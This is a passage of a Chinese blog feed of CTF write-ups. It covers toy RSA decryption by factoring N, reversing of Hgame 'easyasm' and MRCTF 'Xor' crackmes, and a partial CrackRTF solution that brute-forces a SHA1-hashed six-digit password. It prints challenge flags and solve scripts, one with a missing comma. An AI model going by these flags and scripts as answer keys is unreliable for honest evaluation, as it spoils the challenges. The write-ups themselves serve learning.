display="block"><semantics><mrow><mn>1</mn><mo>&lt;</mo><mi>E</mi><mo>&lt;</mo><mi>L</mi></mrow><annotation encoding="application/x-tex">1&lt;E&lt;L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68354em;vertical-align:-0.0391em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>E</mi><mo separator="true">,</mo><mi>L</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">gcd(E, L) = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">L</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></span></p><p>E 是一个比 1 大但是比 L 即 lcm 小的数，gcd 就是最大公约数的意思</p><h4 id="求d"><a class="markdownIt-Anchor" href="#求d">#</a> 求 D</h4><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mn>1</mn><mo>&lt;</mo><mi>D</mi><mo>&lt;</mo><mi>L</mi></mrow><annotation encoding="application/x-tex">1&lt;D&lt;L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68354em;vertical-align:-0.0391em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>E</mi><mo>×</mo><mi>D</mi><mi>m</mi><mi>o</mi><mi>d</mi><mi>L</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">E × D mod L = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></span></p><h3 id="实战"><a class="markdownIt-Anchor" href="#实战">#</a> 实战：</h3><p>了解了原理之后我们来实战一下</p><p>这有一道题</p><img src="/2022/03/25/RSA%E7%AE%97%E6%B3%95/1.jpg" class><p>很明显，其中 E 指数 = 65537，N = 103461035900816914121390101299049044413950405173712170434161686539878160984549</p><p>而 ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35 则是 16 进制密文</p><p>我们可以通过分解 N 来求 p 和 q，可以用 http://www.factordb.com/ 这个网站来分解，分解得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = 282164587459512124844245113950593348271</span><br><span class="line">q = 366669102002966856876605669837014229419</span><br></pre></td></tr></table></figure><p>这样我们就可以通过 p-1 和 q-1 来求 L ，但 L 只是一个中间变量，我们现在可以不求出来，最后用脚本代入即可，求出 L 之后就可以求出 D，求出 D 之后就可以解出来了</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>明文</mtext><mo>=</mo><mtext>密</mtext><msup><mtext>文</mtext><mi>D</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>N</mi></mrow><annotation encoding="application/x-tex">明文 = 密文^D mod N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">明</span><span class="mord cjk_fallback">文</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8913309999999999em;vertical-align:0em;"></span><span class="mord cjk_fallback">密</span><span class="mord"><span class="mord cjk_fallback">文</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">D</span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span></span></p><h4 id="脚本如下"><a class="markdownIt-Anchor" href="#脚本如下">#</a> 脚本如下</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">p = <span class="number">282164587459512124844245113950593348271</span></span><br><span class="line">q = <span class="number">366669102002966856876605669837014229419</span></span><br><span class="line">E = <span class="number">65537</span></span><br><span class="line">miwen = <span class="number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span></span><br><span class="line"></span><br><span class="line">N = p * q</span><br><span class="line">D = gmpy2.invert(E, (p-<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">mingwen = gmpy2.powmod(miwen, D, N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(mingwen)[<span class="number">2</span>:]).decode(encoding=<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解出 flag 为：<strong>suctf{Pwn_@_hundred_years}</strong></p><p>题目来源：<a href="https://buuoj.cn/challenges#%5BSUCTF2019%5DSignIn">BUUCTF 在线评测 (buuoj.cn)</a></p><p>参考博客：<a href="https://blog.csdn.net/dbs1215/article/details/48953589">(25 条消息) 带你彻底理解 RSA 算法原理_小宝一号的博客 - CSDN 博客_rsa 是哪个国家</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>easyasm</title>
      <link href="/2022/03/15/easyasm/"/>
      <url>/2022/03/15/easyasm/</url>
      
        <content type="html"><![CDATA[<h3 id="汇编语言"><a class="markdownIt-Anchor" href="#汇编语言">#</a> 汇编语言</h3><p>这个题是寒假的时候一个叫 Hgame 的比赛的题，当时也做了一下没看懂，开学之后学了点汇编之后就勉强能看懂了，勉强弄懂了它的逻辑，先看看它的汇编语言吧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">seg001:0000 seg001          segment byte public &#x27;UNK&#x27; use16</span><br><span class="line">seg001:0000                 assume cs:seg001</span><br><span class="line">seg001:0000                 assume es:nothing, ss:nothing, ds:dseg, fs:nothing, gs:nothing</span><br><span class="line">seg001:0000                 db  91h</span><br><span class="line">seg001:0001                 db  61h ; a</span><br><span class="line">seg001:0002                 db    1</span><br><span class="line">seg001:0003                 db 0C1h</span><br><span class="line">seg001:0004                 db  41h ; A</span><br><span class="line">seg001:0005                 db 0A0h</span><br><span class="line">seg001:0006                 db  60h ; `</span><br><span class="line">seg001:0007                 db  41h ; A</span><br><span class="line">seg001:0008                 db 0D1h</span><br><span class="line">seg001:0009                 db  21h ; !</span><br><span class="line">seg001:000A                 db  14h</span><br><span class="line">seg001:000B                 db 0C1h</span><br><span class="line">seg001:000C                 db  41h ; A</span><br><span class="line">seg001:000D                 db 0E2h</span><br><span class="line">seg001:000E                 db  50h ; P</span><br><span class="line">seg001:000F                 db 0E1h</span><br><span class="line">seg001:0010                 db 0E2h</span><br><span class="line">seg001:0011                 db  54h ; T</span><br><span class="line">seg001:0012                 db  20h</span><br><span class="line">seg001:0013                 db 0C1h</span><br><span class="line">seg001:0014                 db 0E2h</span><br><span class="line">seg001:0015                 db  60h ; `</span><br><span class="line">seg001:0016                 db  14h</span><br><span class="line">seg001:0017                 db  30h ; 0</span><br><span class="line">seg001:0018                 db 0D1h</span><br><span class="line">seg001:0019                 db  51h ; Q</span><br><span class="line">seg001:001A                 db 0C0h</span><br><span class="line">seg001:001B                 db  17h</span><br><span class="line">seg001:001C                 db    0</span><br><span class="line">seg001:001D                 db    0</span><br><span class="line">seg001:001E                 db    0</span><br><span class="line">seg001:001F                 db    0</span><br><span class="line">seg001:001F seg001          ends</span><br><span class="line">seg001:001F</span><br><span class="line">seg002:0000 ; ===========================================================================</span><br><span class="line">seg002:0000</span><br><span class="line">seg002:0000 ; Segment type: Uninitialized</span><br><span class="line">seg002:0000 seg002          segment byte stack &#x27;STACK&#x27; use16</span><br><span class="line">seg002:0000                 assume cs:seg002</span><br><span class="line">seg002:0000                 assume es:nothing, ss:nothing, ds:dseg, fs:nothing, gs:nothing</span><br><span class="line">seg002:0000                 db 80h dup(0)</span><br><span class="line">seg002:0000 seg002          ends</span><br><span class="line">seg002:0000</span><br><span class="line">seg003:0000 ; ===========================================================================</span><br><span class="line">seg003:0000</span><br><span class="line">seg003:0000 ; Segment type: Pure code</span><br><span class="line">seg003:0000 seg003          segment byte public &#x27;CODE&#x27; use16</span><br><span class="line">seg003:0000                 assume cs:seg003</span><br><span class="line">seg003:0000                 assume es:nothing, ss:seg002, ds:nothing, fs:nothing, gs:nothing</span><br><span class="line">seg003:0000</span><br><span class="line">seg003:0000 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">seg003:0000</span><br><span class="line">seg003:0000 ; Attributes: noreturn</span><br><span class="line">seg003:0000</span><br><span class="line">seg003:0000                 public start</span><br><span class="line">seg003:0000 start           proc near</span><br><span class="line">seg003:0000                 mov     ax, seg dseg</span><br><span class="line">seg003:0003                 mov     ds, ax</span><br><span class="line">seg003:0005                 assume ds:dseg</span><br><span class="line">seg003:0005                 mov     ax, seg seg001</span><br><span class="line">seg003:0008                 mov     es, ax</span><br><span class="line">seg003:000A                 assume es:seg001</span><br><span class="line">seg003:000A                 mov     si, 0</span><br><span class="line">seg003:000D</span><br><span class="line">seg003:000D loc_100DD:                              ; CODE XREF: start+38↓j</span><br><span class="line">seg003:000D                 cmp     si, 1Ch</span><br><span class="line">seg003:0010                 jz      short loc_10135</span><br><span class="line">seg003:0012                 xor     ax, ax</span><br><span class="line">seg003:0014                 mov     al, [si]</span><br><span class="line">seg003:0016                 shl     al, 1</span><br><span class="line">seg003:0018                 shl     al, 1</span><br><span class="line">seg003:001A                 shl     al, 1</span><br><span class="line">seg003:001C                 shl     al, 1</span><br><span class="line">seg003:001E                 push    ax</span><br><span class="line">seg003:001F                 xor     ax, ax</span><br><span class="line">seg003:0021                 mov     al, [si]</span><br><span class="line">seg003:0023                 shr     al, 1</span><br><span class="line">seg003:0025                 shr     al, 1</span><br><span class="line">seg003:0027                 shr     al, 1</span><br><span class="line">seg003:0029                 shr     al, 1</span><br><span class="line">seg003:002B                 pop     bx</span><br><span class="line">seg003:002C                 add     ax, bx</span><br><span class="line">seg003:002E                 xor     ax, 17h</span><br><span class="line">seg003:0031                 add     si, 1</span><br><span class="line">seg003:0034                 cmp     al, es:[si-1]</span><br><span class="line">seg003:0038                 jz      short loc_100DD</span><br><span class="line">seg003:003A                 mov     ax, 0B800h</span><br><span class="line">seg003:003D                 mov     es, ax</span><br><span class="line">seg003:003F                 assume es:nothing</span><br><span class="line">seg003:003F                 mov     byte ptr es:0, 77h ; &#x27;w&#x27;</span><br><span class="line">seg003:0045                 mov     byte ptr es:2, 72h ; &#x27;r&#x27;</span><br><span class="line">seg003:004B                 mov     byte ptr es:4, 6Fh ; &#x27;o&#x27;</span><br><span class="line">seg003:0051                 mov     byte ptr es:6, 6Eh ; &#x27;n&#x27;</span><br><span class="line">seg003:0057                 mov     byte ptr es:8, 67h ; &#x27;g&#x27;</span><br><span class="line">seg003:005D                 mov     byte ptr es:0Ah, 21h ; &#x27;!&#x27;</span><br><span class="line">seg003:0063</span><br><span class="line">seg003:0063 loc_10133:                              ; CODE XREF: start:loc_10133↓j</span><br><span class="line">seg003:0063                 jmp     short loc_10133</span><br><span class="line">seg003:0065 ; ---------------------------------------------------------------------------</span><br><span class="line">seg003:0065</span><br><span class="line">seg003:0065 loc_10135:                              ; CODE XREF: start+10↑j</span><br><span class="line">seg003:0065                 mov     ax, 0B800h</span><br><span class="line">seg003:0068                 mov     es, ax</span><br><span class="line">seg003:006A                 mov     byte ptr es:0, 72h ; &#x27;r&#x27;</span><br><span class="line">seg003:0070                 mov     byte ptr es:2, 69h ; &#x27;i&#x27;</span><br><span class="line">seg003:0076                 mov     byte ptr es:4, 67h ; &#x27;g&#x27;</span><br><span class="line">seg003:007C                 mov     byte ptr es:6, 68h ; &#x27;h&#x27;</span><br><span class="line">seg003:0082                 mov     byte ptr es:8, 74h ; &#x27;t&#x27;</span><br><span class="line">seg003:0088                 mov     byte ptr es:0Ah, 21h ; &#x27;!&#x27;</span><br><span class="line">seg003:008E</span><br><span class="line">seg003:008E loc_1015E:                              ; CODE XREF: start:loc_1015E↓j</span><br><span class="line">seg003:008E                 jmp     short loc_1015E</span><br><span class="line">seg003:008E start           endp</span><br><span class="line">seg003:008E</span><br><span class="line">seg003:008E seg003          ends</span><br><span class="line">seg003:008E</span><br><span class="line">seg003:008E</span><br><span class="line">seg003:008E                 end start</span><br></pre></td></tr></table></figure><h3 id="思路"><a class="markdownIt-Anchor" href="#思路">#</a> 思路</h3><p>它的逻辑是将输入的字符左移四位再右移四位再相加，然后再将每一位与 0x17 异或运算，如果每一位结果都等于 seg001 中的值对应相等就输出 right，那么我们就逆着来写个脚本</p><h3 id="脚本"><a class="markdownIt-Anchor" href="#脚本">#</a> 脚本</h3><h4 id="问题"><a class="markdownIt-Anchor" href="#问题">#</a> 问题</h4><p>一开始我是用 python 写的，但是一直输出不了正确答案，我很疑惑，然后看了大佬写的脚本之后发现他们在第八行，在左移的时候给 xor 还与上了一个 0x0f（还有大佬与上的是 0xff），这样之后结果就是对的，这里我还是没搞懂</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">0x91</span>, <span class="number">0x61</span>, <span class="number">0x1</span>, <span class="number">0xc1</span>, <span class="number">0x41</span>, <span class="number">0xa0</span>, <span class="number">0x60</span>, <span class="number">0x41</span>, <span class="number">0xd1</span>, <span class="number">0x21</span>, <span class="number">0x14</span>, <span class="number">0xc1</span>, <span class="number">0x41</span>, <span class="number">0xe2</span> <span class="number">0x50</span>, <span class="number">0xe1</span>, <span class="number">0xe2</span>, <span class="number">0x54</span>, <span class="number">0x20</span>, <span class="number">0xc1</span>, <span class="number">0xe2</span>, <span class="number">0x60</span>, <span class="number">0x14</span>, <span class="number">0x30</span>, <span class="number">0xd1</span>, <span class="number">0x51</span>, <span class="number">0xc0</span>, <span class="number">0x17</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    xor = i ^ <span class="number">0x17</span></span><br><span class="line"></span><br><span class="line">    flag += <span class="built_in">chr</span>((xor &gt;&gt; <span class="number">4</span>) + ((xor &amp; <span class="number">0x0f</span>) &lt;&lt; <span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后我同学就告诉我用 c 语言来写脚本，发现 c 语言可以不用这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">28</span>] = &#123;<span class="number">0x91</span>,<span class="number">0x61</span>,<span class="number">0x1</span>,<span class="number">0xc1</span>,<span class="number">0x41</span>,<span class="number">0xa0</span>,<span class="number">0x60</span>,<span class="number">0x41</span>,<span class="number">0xd1</span>,<span class="number">0x21</span>,<span class="number">0x14</span>,<span class="number">0xc1</span>,<span class="number">0x41</span>,<span class="number">0xe2</span>,<span class="number">0x50</span>,<span class="number">0xe1</span>,<span class="number">0xe2</span>,<span class="number">0x54</span>,<span class="number">0x20</span>,<span class="number">0xc1</span>,<span class="number">0xe2</span>,<span class="number">0x60</span>,<span class="number">0x14</span>,<span class="number">0x30</span>,<span class="number">0xd1</span>,<span class="number">0x51</span>,<span class="number">0xc0</span>,<span class="number">0x17</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">28</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i] = a[i] ^ <span class="number">23</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">28</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i] = (a[i]&gt;&gt;<span class="number">4</span>)+ (a[i]&lt;&lt;<span class="number">4</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,a[i]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里要注意一个细节，就是在程序中，我们的值是先进行左移再进行右移的，所以我们在写脚本的时候要注意，要先右移再左移，这样的结果才是对的，一开始我没注意，我同学告诉我之后我才知道这个细节，学到了</p><p>最后得到 flag：<strong>hgame{welc0me_to_4sm_w0rld}</strong></p><p>题目来源：Hgame ctf 2022 – easyasm</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xor</title>
      <link href="/2022/03/14/Xor/"/>
      <url>/2022/03/14/Xor/</url>
      
        <content type="html"><![CDATA[<p>查壳后发现无壳且是 32 位程序，所以我们直接用 32 位 IDA PRO 打开即可，还是一样找主函数，但是当我 F5 反汇编的之后却发现无法反汇编</p><img src="/2022/03/14/Xor/1.jpg" class><p>在这里我卡住了，于是我上网查了一下别的大佬写的 wp</p><img src="/2022/03/14/Xor/2.jpg" class><p>我们跟踪一下这个地址，跳到<strong> 00401095</strong> 这个地址之后，我们再按 F5 反汇编，然后再重新进入 main 函数，就可以反汇编了</p><img src="/2022/03/14/Xor/3.jpg" class><p>这下思路就很清晰了，逻辑很简单，就直接上脚本吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;MSAWB~FXZ:J:`tQJ&quot;N@ bpdd&#125;8g&#x27;</span></span><br><span class="line">b = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    b += <span class="built_in">chr</span> (i ^ <span class="built_in">ord</span>(a[i]))</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到 flag：<strong>MRCTF{@_R3@1ly_E2_R3verse!}</strong></p><p>题目来源：<a href="https://buuoj.cn/challenges">BUUCTF 在线评测 (buuoj.cn)</a>–Xor</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CrackRTF</title>
      <link href="/2022/03/12/CrackRTF/"/>
      <url>/2022/03/12/CrackRTF/</url>
      
        <content type="html"><![CDATA[<p><strong>首先我想说，这道题对于我这个小白来说简直是难出天际，还是看了好多大佬的 wp 才能勉强做出来，中间仍然有一些没理解的地方</strong></p><p>首先照例拿到 exeinfope 中查看，是 32 位程序，拿到 IDA PRO 中查找主函数，主函数如下：</p><img src="/2022/03/12/CrackRTF/1.jpg" class><p>真的好长，我看了好久吧久才看懂它的大概思路</p><h4 id="第一部分"><a class="markdownIt-Anchor" href="#第一部分">#</a> 第一部分</h4><img src="/2022/03/12/CrackRTF/2.jpg" class><p>看这一部分，我们可以知道，它这个密码是 6 位数，而且大于 100000</p><p>关键来了，这个六位数我们要把它和 @DBApp 拼接，然后放到 sub_40100A 这个函数中进行计算，计算得出的结果要等于<strong> 6E32D0943418C2C33385BC35A1470250DD8923A9</strong></p><h5 id="引申知识点"><a class="markdownIt-Anchor" href="#引申知识点">#</a> <strong>引申知识点</strong></h5><ul><li><strong>atoi</strong> 函数的作用是将字符串转化为整型</li><li><strong>strcmpi</strong> 函数是将两个字符串进行对比，并且忽略大小写的影响，例如 Yes 和 YES 的输出结果仍为 1，但在这里的<strong> strcmpi</strong> 函数前有一个！，输出结果应该是 0，按理来说不会运行下面的代码，这里有点没搞明白</li></ul><p>我们点开<strong> sub_40100A</strong> 函数：</p><img src="/2022/03/12/CrackRTF/3.jpg" class><p>看见了很多新的东西，我就是从这里开始崩溃的…</p><p>但是不能慌，我们可以上网查，但是上网查了之后也没怎么懂，看了大佬的 wp 之后才理解，这是一个哈希加密，然后一般的范围是小于 999999（这里我没太明白，我也没理解这个范围是怎么求的）</p><h5 id="脚本1"><a class="markdownIt-Anchor" href="#脚本1">#</a> 脚本 1</h5><p>所以我们可以在这个范围里面进行爆破解密，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">str1 = <span class="string">&#x27;@DBApp&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>, <span class="number">999999</span>):</span><br><span class="line">    psw = <span class="built_in">str</span>(i)+str1</span><br><span class="line">    x = hashlib.sha1(psw.encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">    y = x.hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;6e32d0943418c2c33385bc35a1470250dd8923a9&quot;</span> == y:</span><br><span class="line">        <span class="built_in">print</span>(psw)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="补充"><a class="markdownIt-Anchor" href="#补充">#</a> 补充</h5><ul><li>encode 是编码，后面的括号内是其编码的格式，这里就是将得到的 psw 编码为 utf8 格式</li><li>x.hexdigest () 是将 y 转换成 16 进制格式进而与 6e32d0943418c2c33385bc35a1470250dd8923a9 进行计算，如果去掉 hex 就是十进制</li></ul><p>爆破后得到<strong> 123321@DBApp</strong>，密码就是前六位也就是<strong> 123321</strong>（说实话做到这我人已经懵了，光是我自己我基本做不出来，虽然脚本是自己写的，但思路都是参照大佬的 wp 来的）</p><h4 id="第二部分"><a class="markdownIt-Anchor" href="#第二部分">#</a> 第二部分</h4><p>第一个密码终于解出来了，现在要解第二个密码</p><img src="/2022/03/12/CrackRTF/4.jpg" class><p>其实这个<strong> sub_401019</strong> 函数和第一个差不多，但是我们没有范围，所以不能爆破，只能跳过了</p><p>但是不要灰心，“亲爱的” 出题人在后面又给了我们两个函数噢！</p><p>我们点开<strong> sub_40100F</strong> 这个函数进去，会发现又有一大堆新的东西！！完全看不懂是什么</p><img src="/2022/03/12/CrackRTF/5.jpg" class><p>在百度查了一下<strong> FindResourceA</strong> 这个函数，我看不太懂，我就直接移植大佬的解释吧</p><img src="/2022/03/12/CrackRTF/6.jpg" class><p>呃，其实还是不太理解哈哈哈哈</p><p>现在我们看到<strong> sub_401005</strong> 这个函数</p><img src="/2022/03/12/CrackRTF/7.jpg" class><p>上面<strong> FindResourceA</strong> 